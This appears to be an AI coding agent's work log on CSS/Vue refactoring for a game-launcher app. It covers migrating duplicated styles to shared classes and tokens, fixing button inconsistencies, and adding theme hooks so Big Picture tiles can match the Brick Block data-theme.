- `backdrop-fade-*` transition classes - genuinely forced identical by both files' own
  `<Transition name="backdrop-fade">`, not just similar - moved to `styles.css` unscoped with
  the exact same class names Vue already requires
- `.bp-backdrop-overlay-base` - position/inset/z-index only; deliberately did *not* fold in
  the actual gradient `background` value, since the two files' alpha stops are a real design
  difference (the grid needs tiles to stay more visible than the slideshow's hero cover flow
  needs) - kept local per component rather than forcing a false unification
- `.bp-cover-frame` - the button/tile visual base (background/border/radius/padding/cursor)
  shared between `BigPictureTile.vue`'s `.tile` and `BigPictureSlideshow.vue`'s `.strip-cover`
  - two different UI elements (grid tile vs. slideshow strip cover), not the same component,
  but the same visual shape
- `.bp-cover-focused` - the identical focused/centered border-color+box-shadow, applied via a
  template class binding alongside `.bp-cover-frame` rather than a compound selector, so each
  component can still layer its own extra behavior on the *same* shared class name locally
  (`.tile.bp-cover-focused{transform:scale(1.05)}` - the strip-cover's centered state has no
  such extra, needed nothing added)
- `.bp-cover-placeholder` - the placeholder look (`background:#444;display:flex;align-items:
  center;justify-content:center`), dimensions/font-size kept local since they genuinely differ
  per context (grid tile vs. slideshow strip)
- `.bp-empty-state` - deliberately a *different* shared class from the desktop `.empty-state`
  added earlier, not a reuse - different values (font-size 1.5rem, no padding), genuinely a
  different context, would have been a false unification to force onto the same class
- **Found and fixed three more mismatched fallback literals** while touching these exact
  lines, same category as the `--radius-xl` one fixed earlier this session:
  `var(--color-accent, #fff)` (real value `#1e66f5`, a blue, nothing like white),
  `var(--shadow-lg, 0 12px 32px rgba(0, 0, 0, 0.5))` (real alpha `0.18`, not `0.5`), and
  `var(--radius-md, 10px)` (real value `6px`, not `10px`) - none had been individually flagged
  by name in the original audit, only discovered by actually looking at each line being
  migrated rather than trusting the audit summary as the complete list of what needed fixing.
  Dropped all three fallbacks entirely rather than correcting them to matching literals - these
  are base tokens always defined in `:root` (unlike `--balloon-*`/`--font-pixel`'s genuinely
  opt-in pattern), so a defensive fallback was never structurally necessary for them at all
- Verified via compiled CSS with the same rigor as every prior migration this session: each of
  the 7 shared classes present exactly once with the right properties; the `backdrop-fade-*`
  transition present exactly once (not duplicated); every component's leftover scoped rule
  contains only its genuinely-extra properties (`grep`'d each one individually -
  `.big-picture`, `.slideshow`, `.tile`, `.strip-cover`, `.tile.bp-cover-focused`,
  `.tile-cover-placeholder`, `.strip-cover-placeholder`, both `.empty` leftovers); confirmed
  the old `.strip-cover.centered` compound selector is gone entirely, not just superseded;
  confirmed all three old mismatched-fallback strings are gone from source, not just from the
  one line each was found on
- CSS bundle shrank again, 21.85kB → 20.92kB, consistent with real duplication removed
- Remaining from the original audit: Big Picture's whole cluster is now done; only the
  Category 2 unused-token findings (`--space-2`/`--space-3` gaps, `--space-5` padding,
  `--color-on-accent`) are still open

**Migrated the remaining Category 2 unused-token findings, closing out Milestone 17.** Gathered
exact locations for every pattern with `grep -rn` first, rather than fixing from memory of the
audit's summary. ~20 sites across the app:
- `1px` borders → `var(--button-border-width)`: the global `input`/`textarea`/`select` rule
  and `.list-row-shell` (both in `styles.css`), `SkeletonCard.vue`, `ConfirmInstall.vue`'s and
  `PluginSettings.vue`'s danger-callout borders, and two sites the original audit's
  `border: 1px solid` search pattern had missed entirely -
  `NavSidebar.vue`'s `border-right`/`border-top` (longhand properties, not `border` shorthand)
- `0.5rem`/`0.75rem` gaps → `var(--space-2)`/`var(--space-3)` across ~18 sites (`App.vue`,
  `AppSettings.vue`, `BaseModal.vue`, `GameFilters.vue`, `GameList.vue`,
  `InstallableStatus.vue`, `AddPlugin.vue`, `ConfirmInstall.vue`, `EditGame.vue` (including the
  `!important` variant), `PluginSettings.vue` ×5, `ToastContainer.vue`, `BigPictureTile.vue`,
  `AddGame.vue`, `SettingsButton.vue`, `NavSidebar.vue`) - plus a third, previously-unaudited
  site found only by re-`grep`-ing after the known ones were fixed: `GameListRow.vue`'s
  `.meta` rule, a second `gap: 0.75rem` in the same file the audit's line reference for that
  file hadn't captured
- `4px` radius → `var(--radius-sm)` (`NavSidebar.vue`'s `.nav-item`)
- `1.5rem` padding → `var(--space-5)` (`App.vue`'s `.content`, `BaseModal.vue`'s
  `.modal-frame`) - `App.vue`'s companion value, `2rem`, also matched a token exactly
  (`--space-6`), fixed alongside rather than leaving half the declaration hardcoded
- `color: white` → `var(--color-on-accent)` (`TitleBar.vue`'s close-button hover)
- **Deliberately excluded `brick-block-theme`'s own files** from all of the above, despite
  several of its files containing the exact same literal values (`gap: 0.5rem`,
  `border-radius: 4px`) that would otherwise have matched these patterns. Its hardcoded values
  are the built-in theme's own deliberate visual choices - same category as its intentionally
  thicker button/card borders (`2px`/`3px` vs. the app default `1px`) that this whole session
  has consistently treated as theme content, not bugs. A theme overriding the default look on
  purpose is not the same finding as a shared component that forgot to use an existing token
- Verified via exhaustive `grep -rn` across all of `src/` for every pattern, both before making
  changes (to catch sites the original audit missed) and after (to confirm zero literals
  remained anywhere, `brick-block-theme` correctly still showing its own untouched values) -
  not just trusting the original audit's file list as complete, the same lesson already
  learned twice this session (`BaseModal.vue`'s missed `8px`, the mismatched-fallback literals)
- `cargo check` clean (no Rust touched, checked anyway); `bun run build` clean; CSS bundle
  20.92kB → 21.34kB (grew slightly - expected, since replacing several short literals with
  longer `var(--name)` references isn't a duplication-removal step like the earlier migrations,
  it's a correctness one)

**Milestone 17 closed.** Audit → `:root`/primitive-styles relocation → all identified
duplicate-pattern migrations (desktop, then Big Picture's cluster) → the two radius-scale
decisions → this unused-token cleanup. Every step verified against real compiled output, not
assumed correct from the source diff alone - caught real bugs at nearly every stage
(`DataThemeManifest` silently dropping `cardVisual`, four separate mismatched fallback
literals, a scoped-CSS/foreign-component break, sites the original audit itself missed twice).

**Post-close cleanup: removed vestigial local classes left over from the migration.** User's
observation, stated precisely and correctly: scoped styles aren't inherited/reused across
components, so once a component's local class has had every property migrated out to a shared
`styles.css` class, keeping that local class name in the template serves no purpose at all -
it's not "scoped styling that still applies somewhere," it's just a dead label.
- Checked every shared-class template site individually (`grep -rn` for each of the 12 shared
  classes introduced this session) rather than assuming which ones were vestigial - most still
  have real local content and correctly keep both classes (`.thumb`/`.thumb-placeholder`,
  `.filter-tag`, `.tag`, `.empty` ×3, `.big-picture`/`.slideshow`, `.backdrop-overlay`,
  `.strip-cover`/`.strip-cover-dummy`, `.tile`, `.tile-cover-placeholder`/
  `.strip-cover-placeholder` all still carry genuinely-extra properties)
- Found 4 truly empty ones: `GameListRow.vue`'s `.row`, `SkeletonRow.vue`'s `.skeleton-row`,
  and `BigPictureGrid.vue`/`BigPictureSlideshow.vue`'s `.backdrop` - each had already been
  reduced to a comment-only rule with zero actual properties during the earlier migrations.
  Removed the class name from the template and the now-pointless comment from the `<style
  scoped>` block; updated `styles.css`'s own header comments for `.list-row-shell`/
  `.bp-backdrop` to stop referencing class names that no longer exist anywhere
- **Found a second, related case while checking**: `focused`/`centered` on the base
  `BigPictureTile.vue`/`BigPictureSlideshow.vue` are conditionally-bound state classes, not
  permanent base classes, but the same principle applied - once `.tile.focused`/
  `.strip-cover.centered` were replaced by `.tile.bp-cover-focused`/the shared
  `.bp-cover-focused` earlier this session, nothing in CSS targeted bare `.focused`/`.centered`
  anymore either. Confirmed via `grep` that no CSS rule and no JS (`classList`/`querySelector`)
  referenced them before removing - `brick-block-theme`'s own separate `.brick-tile.focused`
  rule is a different component's own scoped style, unrelated and untouched
- Verified via compiled CSS same as every other step: old vestigial selectors produce zero
  output now, the shared classes they were riding alongside still compile with the same
  properties as before - this was a pure cleanup, no behavior change, confirmed rather than
  assumed
- `bun run build`/`cargo check` both clean; CSS bundle size unchanged (21.34kB) - expected,
  since no actual style rules were removed, just dead template references and a few comments

**Converted `.hint` to a real primitive element (`<small>`), on user's further proposal.** The
insight: since scoped styles can't be reused across components anyway, a class name repeated
identically across many files gets nothing extra from staying a class if HTML already has the
semantically-correct primitive for it - a global tag-selector rule (same mechanism `button`/
`input`/`textarea`/`select` already use) works everywhere with zero class needed at all.
- `grep`'d for `.hint` across the whole tree first rather than assuming which files had it -
  5 real sites: `CandidatePicker.vue`, `ConfirmInstall.vue` (×2), `EditGame.vue`,
  `PluginSettings.vue` (×2), mixed between `<p>` and `<span>` tags inconsistently despite being
  the same semantic thing (secondary/muted helper text) everywhere
  - Checked each site's actual rule content too, not just that the class name matched - found
    they weren't quite identical: `CandidatePicker.vue`/`PluginSettings.vue` used
    `font-size: 0.8rem; opacity: 0.7`, `ConfirmInstall.vue`/`EditGame.vue` used
    `font-size: 0.75rem; opacity: 0.8` - a real fork needing a human call, same as the earlier
    `8px` radius decision, not something to silently average or pick. User chose the
    `0.8rem`/`0.7` pairing (as an actual paired combination that already existed somewhere, not
    a new mix of the two files' separate values)
- **Verified the inline-vs-block difference wouldn't visually break anything before
  converting**, rather than assuming `<small>` (inline by default) is a drop-in replacement for
  `<p>` (block) - checked each site's actual parent container:
  - `BaseModal.vue`'s `.modal-body` and `EditGame.vue`'s `label` are both `display:flex;
    flex-direction:column` - flex always blockifies its children for layout purposes
    regardless of their own specified `display`, so `CandidatePicker.vue`/`ConfirmInstall.vue`/
    `EditGame.vue`'s conversions are safe with no override needed
  - `PluginSettings.vue`'s `.tab-panel` is a plain, non-flex `<div>` - a lone inline element
    there would size to its content instead of filling the container width the way the
    original `<p>` did, wrapping text at a different, narrower point. Added an explicit local
    `small { display: block; }` override for just those two sites to guarantee equivalent
    layout, rather than letting a real (if subtle) visual regression slip through
- New global `small { font-size: 0.8rem; opacity: 0.7; }` in `styles.css`, alongside the
  existing `button`/`input` primitive-element rules. Per-component overrides only where
  genuinely needed: `CandidatePicker.vue` keeps its own `margin`, `PluginSettings.vue` keeps
  `display: block` + `margin`; `ConfirmInstall.vue`/`EditGame.vue` need nothing extra at all,
  fully covered by the shared primitive
- Verified via compiled CSS: global `small{font-size:.8rem;opacity:.7}` present once, the two
  per-component `small[data-v-*]` overrides contain exactly the expected extra properties,
  zero `.hint` selector left anywhere. `bun run build`/`cargo check` both clean
- **Found a related but different finding while doing this**: `.error` (byte-identical between
  `AddGame.vue`/`EditGame.vue`, just `color: var(--color-danger)`) is a plain shared-class
  duplicate, not a primitive-element match - there's no HTML tag that means "error message" the
  way `<small>` means "secondary text." Left open, not bundled into this pass since it's a
  genuinely different kind of finding from what was actually asked

**Migrated `.error` too.** No design decision needed here, unlike `.hint` - byte-identical in
both files. New `.error-text` in `styles.css`, both components' local `.error` rules replaced
with a comment pointing at it. Verified via compiled CSS: `.error-text{color:var(--color-
danger)}` present once, zero leftover `.error[data-v-*]` rules anywhere. `bun run build` clean.

**Button-styling consistency pass across components, on user's request.** Delegated to an
Explore agent to audit every `<style scoped>` button rule in the tree, expecting the same kind
of duplication findings as the rest of Milestone 17's follow-ups. The audit came back with
something sharper: two of its findings weren't merely duplicated CSS, they were two components
rendering the *same visual concept* with *actually divergent* results - real bugs, not just
unmigrated repetition. Asked the user via `AskUserQuestion` whether to fix the two real bugs
first or take the full list in file order; user chose fixing the bugs first, deferring the
remaining duplication/design-decision findings.

- **Bug 1: `.view-toggle-button` size mismatch.** `App.vue`'s Big Picture grid/slideshow toggle
  and `GameFilters.vue`'s grid/list toggle both used the literal class name
  `.view-toggle-button` - but only `GameFilters.vue`'s version had ever gotten the real
  square-icon treatment (`width: 2.2rem`, `padding: 0`, centered flex). `App.vue`'s local rule
  was a wider, padded button that just happened to reuse the same name, left over from before
  either was migrated. Sharing a class name across two `<style scoped>` blocks does nothing -
  scoped CSS only ever matches the component that compiled it - so this had silently been two
  different-looking buttons the whole time, not a real shared style. Promoted
  `GameFilters.vue`'s version (the correct, complete one) into `styles.css` as the single
  `.view-toggle-button` rule; removed both local scoped rules, replacing each with a comment
  pointing at the shared definition.
- **Bug 2: `GameCard.vue`/`GameListRow.vue` icon-action row inconsistency.** Both components
  render the identical 4-button set (play/fetch-metadata/edit/remove, same handlers, same
  icons) - `GameCard.vue`'s `.footer` had a tighter icon-button treatment
  (`flex: 1; min-width: 0; padding: 0.35rem 0`) that `GameListRow.vue`'s `.actions` never
  received, leaving its buttons at the global default padding - a visible size/spacing mismatch
  between two renderings of the same actual button row. Added `.icon-action-row button` to
  `styles.css`; applied `icon-action-row` as a second class on both `GameCard.vue`'s `.footer`
  div and `GameListRow.vue`'s `.actions` div (not on each button individually, since both
  already used a `button` descendant selector). `GameCard.vue`'s own local `.footer button` rule
  removed entirely (nothing extra remained); `GameListRow.vue` never had one to remove, so just
  gained the shared behavior it had been missing.
- Verified via compiled CSS (`dist/assets/index-B97rkwHp.css`, 21.05kB) after `bun run build`:
  `.view-toggle-button{display:flex;align-items:center;justify-content:center;width:2.2rem;
  flex-shrink:0;padding:0}` present exactly once, zero old scoped `.view-toggle-button`
  leftovers; `.icon-action-row button{flex:1;min-width:0;padding:.35rem 0}` present exactly
  once, zero old `.footer button` leftovers. `cargo check` run as formality (no Rust touched)
  - clean.
- Remaining audit findings deliberately left open, pending further direction: a clean exact
  duplicate (`AddPlugin.vue`'s `.registry-list button`/`PluginSettings.vue`'s
  `.permission-needed button`, `font-size: 0.75rem; padding: 0.2rem 0.6rem`, no decision
  needed); a small/compact button font-size fork across `0.75rem`/`0.8rem`/`0.85rem` needing a
  real design call (one tier vs. a genuine two-tier system, same category of decision as the
  earlier `8px` radius and `.hint` font-size forks); `TitleBar.vue`'s chromeless window buttons
  (likely a different genre, left alone by default); a repeated `.active` accent-swap idiom
  across `.nav-item.active`/`.filter-tag.active`/`.tabs button.active` (lower priority, possible
  future shared class). Also flagged separately by the audit, not yet scoped: a `--space-*`
  tokenization pass for hardcoded values off the spacing scale (`0.25rem`/`0.35rem`/`0.4rem`/
  `2.2rem`/`46px`).

**Migrated the audit's clean exact duplicate.** `AddPlugin.vue`'s `.registry-list button`
(the per-entry "Install" button in the curated-registry list) and `PluginSettings.vue`'s
`.permission-needed button` (the "Grant" button on the run-programs permission prompt, appearing
at 2 sites - source and wrapper plugin tabs both render the same permission-check markup) were
byte-identical: `font-size: 0.75rem; padding: 0.2rem 0.6rem`. No design decision needed here,
unlike the two bugs fixed earlier in this pass - straightforward migration.
- New `.compact-button` in `styles.css`. Applied directly on each `<button>` element rather
  than via a container descendant selector (unlike `.icon-action-row button`) - these aren't a
  uniform row of several buttons sharing one parent, just individual buttons in otherwise
  differently-shaped contexts (a `<li>` in a list, a `<p>` permission banner).
  - Attempted the two `PluginSettings.vue` "Grant" button edits (both byte-identical lines) via
    a PowerShell `Get-Content`/indexed-assignment/`Set-Content -NoNewline` script rather than
    the Edit tool, since the two lines aren't independently unique. This collapsed the entire
    file to a single line (`-NoNewline` interacting badly with an array of strings passed to
    `Set-Content`) - caught immediately by re-reading the file, restored via
    `git checkout -- <file>` before any further changes, then redone correctly with the Edit
    tool's `replace_all: true` instead, safe here since both target lines are meant to receive
    the exact same edit.
- Removed both local scoped rules (`AddPlugin.vue`'s `.registry-list button`,
  `PluginSettings.vue`'s `.permission-needed button`), replacing each with a comment pointing at
  `.compact-button`.
- Verified via compiled CSS: `.compact-button{font-size:.75rem;padding:.2rem .6rem}` present
  exactly once, zero leftover `.registry-list button`/`.permission-needed button` selectors.
  `bun run build` clean (20.95kB); `cargo check` clean (no Rust touched, checked anyway).

**Resolved the small/compact-button font-size fork, the audit's remaining design-decision
finding.** Grepped every `font-size: 0.75rem|0.8rem|0.85rem` site across `.vue` files first to
find the real button-specific instances (not every font-size hit - most were unrelated text
sizing), then narrowed to actual `button`-selector rules: `.compact-button` (0.75rem, just
migrated above), `PluginSettings.vue`'s `.reorder-buttons button` (0.75rem, the up/down arrow
buttons) and `.uninstall-theme` (0.75rem, the data-theme "Remove" button), `EditGame.vue`'s
`.input-with-button button` (0.8rem, a small button beside a text input) and `.tag-remove`
(0.8rem, a borderless tag "x" button), and `PluginSettings.vue`'s `.scan-button`/
`.add-plugin-button` (0.85rem). Presented the actual fork to the user via `AskUserQuestion`
(collapse to one 0.75rem tier / keep a genuine two-tier 0.75rem-vs-0.8rem system / leave as-is)
rather than picking a resolution unilaterally, same discipline as the earlier `8px` radius and
`.hint` font-size forks. User chose collapsing to one tier, 0.75rem.
- Turned out `.reorder-buttons button`/`.uninstall-theme` were already `0.75rem` - only
  `EditGame.vue`'s two 0.8rem sites actually needed changing, a smaller diff than the fork
  initially suggested.
- **Found the `.scan-button`/`.add-plugin-button` 0.85rem declarations were pure redundancy
  while investigating**, not a real third tier at all: `0.85rem` is literally the global
  `button` element's own default font-size in `styles.css` (line 81), so these two explicit
  overrides did nothing - removed both. `.add-plugin-button` then had zero properties left in
  its `<style scoped>` block, so removed the now-vestigial class from its template too (the
  `<button>` in `PluginSettings.vue`'s header), following the same "scoped styles aren't reused,
  a class with no rule targeting it is dead" reasoning from the earlier vestigial-class cleanup
  pass, not just this pass's own convention.
- Verified via compiled CSS: `input-with-button button[data-v-*]{font-size:.75rem}` and
  `.tag-remove[data-v-*]{...font-size:.75rem...}` both present with the new value;
  `.scan-button[data-v-*]{margin-top:.5rem}` keeps only its real property; zero
  `add-plugin-button` string anywhere in the compiled output. `bun run build`/`cargo check`
  both clean; CSS bundle shrank slightly, 20.95kB → 20.88kB (expected - two rules got smaller,
  one disappeared entirely).

**Migrated the last remaining audit finding: the repeated `.active` accent-swap idiom.**
`NavSidebar.vue`'s `.nav-item.active`, `GameFilters.vue`'s `.filter-tag.active`, and
`PluginSettings.vue`'s `.tabs button.active` were byte-identical
(`background: var(--color-accent); color: var(--color-on-accent)`) - a genuine 3-way exact
duplicate, same category as the `.compact-button`/`.registry-list button` finding earlier in
this pass, not a design decision like the font-size fork.
- New `.accent-active` in `styles.css`.
- Checked each site's `active` class binding for any other purpose before touching it - in all
  three files, `active`/`.active` existed *solely* to trigger this one now-shared rule (grepped
  each file for every other `active` occurrence: component state variables like `activeTab`/
  `activeView` don't count, and none of the three had a second CSS rule or JS `classList`/
  `querySelector` reference to the bare class). Since nothing else depended on the `active`
  class name itself, replaced each `:class="{ active: cond }"` binding directly with
  `:class="{ 'accent-active': cond }"` rather than binding both classes side by side - there
  was nothing left for a separate local `active` class to still mean.
  - `PluginSettings.vue` had 5 tab buttons on this exact pattern (`source`/`theme`/`metadata`/
    `controller`/`wrapper`); reformatted the 3 longer tab names' now-longer `:class`/`@click`
    attribute pairs onto their own lines to stay under a reasonable line width, matching the
    file's existing multi-line button formatting elsewhere.
- Removed all three local scoped `.active` rules, replacing each with a comment pointing at
  `.accent-active`.
- Verified via compiled CSS: `.accent-active{background:var(--color-accent);color:var(--color-
  on-accent)}` present exactly once; zero `nav-item.active`/`filter-tag.active`/
  `tabs button.active` strings anywhere in the compiled output. `bun run build`/`cargo check`
  both clean; CSS bundle shrank again, 20.88kB → 20.67kB.

**Button-consistency follow-up fully closed.** Every finding from the delegated audit has now
been resolved or explicitly deferred: the two real bugs (`.view-toggle-button`,
`.icon-action-row`), the clean exact duplicate (`.compact-button`), the font-size fork
(collapsed to one 0.75rem tier), and the `.active` idiom (`.accent-active`) are all done.
`TitleBar.vue`'s chromeless window buttons were left alone throughout - a genuinely different
genre of button (no border, transparent background, fixed 46px square), not a variant of any of
the shared classes introduced this pass. The `--space-*` tokenization pass the audit flagged
separately (hardcoded `0.25rem`/`0.35rem`/`0.4rem`/`2.2rem`/`46px` values off the spacing scale)
remains open and unscoped - a distinct piece of follow-up work, not bundled into this pass.

## Milestone 18 — Retire Component-Swap Theming (scoped, not started)

**Groundwork: matched `brick-block-data-theme`'s button frame to its card frame, on user
request ("try copying GameCards' frame style to buttons in brick block theme").** First applied
to the *built-in* `brick-block-theme` plugin's own `.footer button` rule (bumped its border from
an approximate `2px` to the card frame's real `3px`, both using `var(--color-surface1,
#7c2c00)`) - a same-component scoped-CSS tweak, no new capability needed there. User then
clarified the actual target was the *detached data-theme* (`brick-block-data-theme`), which has
no scoped CSS of its own at all - its real app buttons render through the global `button`
primitive in `styles.css`, using whatever `cssVariables` it declares.
- Root cause: the global `button` rule's `border-radius: var(--radius-md)` had no opt-in
  override (unlike `--card-radius`/`--balloon-radius`), and its border color was hardcoded to
  `--color-surface0` with no way for a theme to point it at a different token - the color the
  card frame actually uses (`--color-surface1`) in this theme's palette.
- Added two new opt-in hooks to `styles.css`'s global `button` rule, same pattern as every other
  per-element hook in this project: `--button-radius` (falls back to `--radius-md`),
  `--button-border-color` (falls back to `--color-surface0`).
- `brick-block-data-theme`'s manifest set both - `--button-radius: 0`, `--button-border-color:
  #7c2c00` - alongside bumping `--button-border-width` from `2px` to `3px` to match the card
  frame's real width (the manifest had shipped with only an approximation).
- Version bumped in three small, independently-verified steps rather than one batched change:
  1.2.0 → 1.2.1 (`--button-border-width` fix) → 1.2.2 (`--button-radius`) → 1.2.3
  (`--button-border-color`) - each copied into the app's cached
  `data-themes/brick-block-data-theme/theme.json` and confirmed before moving to the next.
- `bun run build` clean after each `styles.css` addition; no Rust touched.

**Reviewed `src/theme/` for what's load-bearing, on user's request.** All four files
(`cardVisualAst.ts`, `cardVisualRegistry.ts`, `fontFaceRegistry.ts`, `slotRegistry.ts`) are
genuinely wired in - not dead, not redundant with each other - but serve two structurally
different theme mechanisms: `slotRegistry.ts` is the whole-component-swap path
(`GameGrid.vue`/`BigPictureGrid.vue`'s `useThemeSlot`, `stores/theme.ts`'s
`setActiveSlots`/`clearActiveSlots`), while the AST/registry/font-face trio is the data-only
declarative path a JSON manifest can actually use.

Follow-up question surfaced the real finding: **`slotRegistry.ts` has exactly one live
consumer.** Grepped every `ThemePlugin` for a `slots` field - only the built-in
`brick-block-theme` sets one. If that plugin were removed today, `slotRegistry.ts` and its call
sites wouldn't error, they'd just go permanently inert (`activeSlots` never populated by
anything, `useThemeSlot` always resolving to its fallback) - dead weight with nothing left to
reactivate it, since a JSON data-theme manifest structurally can't ship a real Vue component the
way `slots` requires.

**Decided to retire component-swap theming entirely rather than leave it stranded.** Weighed the
tradeoff directly: JSON-AST/tokens are strictly safer for untrusted third-party themes (no code
execution, validated schema - see Milestone 16's sandbox-escape findings for why that matters)
but bounded by whatever node types/hooks the core app has built; component-swap has no such
ceiling but requires either build-time bundling (today's built-in-only limitation) or a much
larger trust boundary for real third-party distribution. Given the project already committed to
signed/sandboxed WASM distribution for source plugins, and this session's own hook additions
(card frame, balloon, cover placeholder, and now button frame/radius/border-color) have closed
nearly all of Brick Block's *desktop*-card visual gap already, kept component-swap only made
sense as a temporary bridge, not a permanent second theming mechanism.

**Scoped Milestone 18 around the one real blocker: Big Picture.** `BigPictureTile.vue` never
got the AST-override treatment `GameCard.vue` did - flagged as a forward-looking risk back in
Milestone 17's audit, now the concrete reason this can't just be deleted today.
`BrickBlockBigPictureTile.vue`'s look (4px pixel border, diagonal-stripe placeholder, pixel
font) has no data-theme equivalent path, and its frame/placeholder colors (`#111`/`#444`) are
hardcoded literals, not tokenized like `GameCard.vue`'s already are. Scoped the milestone to
close that gap first, prove full parity between the built-in and data-theme versions, and only
then actually delete the built-in plugin and the now-fully-dead `slotRegistry.ts`/
`ThemeSlotName` - deliberately not deleting anything before parity is verified, since that would
silently regress Big Picture's Brick Block appearance for anyone still on the built-in version.

**Gave `BigPictureTile.vue` a `cardVisual`-AST render path, closing the milestone's first real
gap.** Wired in exactly the same pattern `GameCard.vue` already uses: `CardVisualRenderer`/
`useActiveCardVisual` from the existing `theme/cardVisualAst.ts`/`cardVisualRegistry.ts` -
deliberately the *same* shared `activeCardVisual` ref, not a second one, since a theme's
`cardVisual` field describes one cover-art rendering concept, reusable wherever a game's cover
needs rendering.
- Found a real structural mismatch before wiring it in: `GameCard.vue`'s `.card-visual` wrapper
  has `overflow: hidden` + its own radius, so the AST's `.cover`/`.cover-placeholder` output
  (styled by a global, unscoped rule in `GameCard.vue` with no radius of its own by design) gets
  clipped correctly by the wrapper. `BigPictureTile.vue`'s `.bp-cover-frame` had no
  `overflow: hidden` - its own `.tile-cover`/`.tile-cover-placeholder` rounded themselves
  individually instead. Without fixing this first, an active theme's AST output would have
  rendered with square corners in Big Picture while working correctly on the desktop grid.
  Added `overflow: hidden` to the shared `.bp-cover-frame` rule (also benefits
  `BigPictureSlideshow.vue`'s `.strip-cover`, which shares the same class) - verified via
  compiled CSS.
- Confirmed no further sizing work was needed: the AST's `.cover`/`.cover-placeholder` classes'
  global `width: 100%; aspect-ratio: 3/4; object-fit: cover` values already exactly matched
  `.tile-cover`/`.tile-cover-placeholder`'s own values - not a coincidence, both were already
  aligned during Milestone 17's tokenization pass.
- `bun run build` (typecheck + build) clean; `cargo check` clean (no Rust touched).

**Tokenized `BigPictureTile.vue`'s frame/title, the milestone's second checklist item.**
Re-compared `BrickBlockBigPictureTile.vue`'s `.brick-frame` against the default
`.bp-cover-frame` and found the AST path alone doesn't close the whole gap: Brick Block's tile
has a *permanent* 4px border + diagonal-stripe background, visible even unfocused, while
`.bp-cover-frame` is `border: 3px solid transparent` until a separate `.bp-cover-focused` state
class swaps it to the accent color - there was no opt-in hook for a theme to give the frame a
permanent look the way `GameCard.vue`'s `--card-border-width`/`--card-radius` already let it.
Brick Block's tile title also uses a pixel font + a black drop-shadow for readability, with
nothing on `.tile-title` to hook into either.
- Added `--tile-background`/`--tile-border-width`/`--tile-border-color` to the shared
  `.bp-cover-frame` rule (all undeclared by default - `none`/`3px`/`transparent`, matching
  today's exact look with zero hooks set) and `--tile-title-font-family`/
  `--tile-title-text-shadow` to `BigPictureTile.vue`'s own local `.tile-title` rule (same
  reasoning as `--balloon-font-family`).
- `.bp-cover-focused`'s existing `border-color: var(--color-accent)` still wins on focus
  regardless of what a theme sets `--tile-border-color` to, matching
  `.brick-tile.focused .brick-frame`'s own behavior exactly (focus always shows the accent
  ring, no exception).
- Verified via compiled CSS: `.bp-cover-frame{background:var(--tile-background, none);
  border:var(--tile-border-width, 3px) solid var(--tile-border-color, transparent);...}` and
  `.tile-title[data-v-*]{...font-family:var(--tile-title-font-family, inherit);
  text-shadow:var(--tile-title-text-shadow, none)}` both present with the expected fallbacks.
  `bun run build`/`cargo check` both clean.
- Not yet done: actually setting these new hooks in `brick-block-data-theme`'s manifest to
  reproduce Brick Block's Big Picture look for real (next checklist item) - this pass only
  built the capability and verified it compiles with safe no-op defaults.

**Ported Brick Block's Big Picture tile look to `brick-block-data-theme`'s manifest
(`data-theme-plugins` repo).** No new AST work needed here at all - the manifest's existing
`cardVisual` field (the `if`/`image`/`else`-`★` shape, already written for the desktop card back
in Milestone 16) is the same shared registry `BigPictureTile.vue` now reads too, so the star
glyph and cover-art swap already worked correctly the moment the AST render path landed. This
pass only needed the new `--tile-*` hooks set in `cssVariables`:
- `--tile-background`: the same diagonal-stripe `repeating-linear-gradient` pattern as
  `--cover-placeholder-background`, at the built-in `BrickBlockBigPictureTile.vue`'s actual
  stripe width (`12px`/`14px` stops, not the card's `10px`/`12px` - the two were never identical
  even in the original built-in component, kept that intentional difference rather than
  unifying it).
- `--tile-border-width: 4px`, matching `.brick-frame`'s real width (thicker than the card
  frame's `3px` - again an intentional built-in difference, not a bug to fix).
- `--tile-border-color: var(--color-surface1)` - referenced the existing token rather than
  repeating its literal hex, same pattern already used by `--balloon-background`.
- `--tile-title-font-family`/`--tile-title-text-shadow`: identical values to
  `--balloon-font-family` (the same pixel font) and the built-in title's `2px 2px 0 #000`
  drop-shadow.
- Version bumped `1.2.3` → `1.3.0` (minor - new capability usage via new `cssVariables` keys,
  backward compatible since an older app build simply ignores unknown custom properties rather
  than breaking). Copied into the app's cached `data-themes/brick-block-data-theme/theme.json`
  and verified live, same discipline as every other manifest change this session - not just
  assumed correct from the diff.

**Verified full parity between the built-in `brick-block-theme` and the data-theme version,
property by property rather than eyeballing it.** Read every visual rule in
`BrickBlockGameCard.vue`/`BrickBlockBigPictureTile.vue` side-by-side against
`brick-block-data-theme`'s `cssVariables`, matching each one to whichever opt-in hook (or lack
of one) governs it on the host app side. Found two more real gaps this way, both closed with
new hooks following the exact same pattern as everything else this milestone:
- **Tile corner radius** - built-in `.brick-frame` uses `4px`; the shared `.bp-cover-frame` had
  its `border-radius` hardcoded to `var(--radius-xl, 10px)` with no override at all (unlike
  `--card-radius` on the desktop side, which *does* have one). Added `--tile-radius` (falls back
  to the existing default), set to `4px` in the manifest.
- **Focus-ring style** - built-in's `.brick-tile.focused .brick-frame` shows a solid
  `0 0 0 4px var(--color-accent)` ring; the shared `.bp-cover-focused` uses `box-shadow:
  var(--shadow-lg)` (a soft, generic elevation shadow) with no override. Added
  `--tile-focus-shadow` (falls back to `var(--shadow-lg)`), set to
  `0 0 0 4px var(--color-accent)` in the manifest - reusing the theme's own accent token rather
  than a literal hex, consistent with `--balloon-background`/`--tile-border-color`'s existing
  `var(--color-accent)`-style references.
- Verified via compiled CSS: `.bp-cover-frame{...border-radius:var(--tile-radius, var(--radius-
  xl, 10px))...}` and `.bp-cover-focused{border-color:var(--color-accent);box-shadow:var(--tile-
  focus-shadow, var(--shadow-lg))}` both present with the expected fallback chain. `bun run
  build`/`cargo check` both clean. Manifest bumped `1.3.0` → `1.3.1`, copied into the app's
  cached theme.json, verified live.
- Two more gaps found but deliberately left open, not real blockers: the built-in balloon's
  title/playtime type sizes (`0.85rem`/`1.4` line-height, `0.75rem`) have no override hooks at
  all (the base `GameCard.vue` balloon's own `.balloon-title`/`.balloon-playtime` font-size
  rules were never tokenized, pre-dating this milestone entirely), and the built-in swap
  deliberately renders the cover-placeholder star *larger* in Big Picture (`4rem`) than on the
  desktop card (`2.5rem`) - since both contexts share one `cardVisual` AST and one set of
  `--cover-placeholder-*` hooks by design, the data-theme version necessarily renders the same
  size in both places. Closing either would mean doubling several hooks into desktop/tile-
  specific variants purely for a cosmetic-only difference - not worth the added surface for what
  it buys.

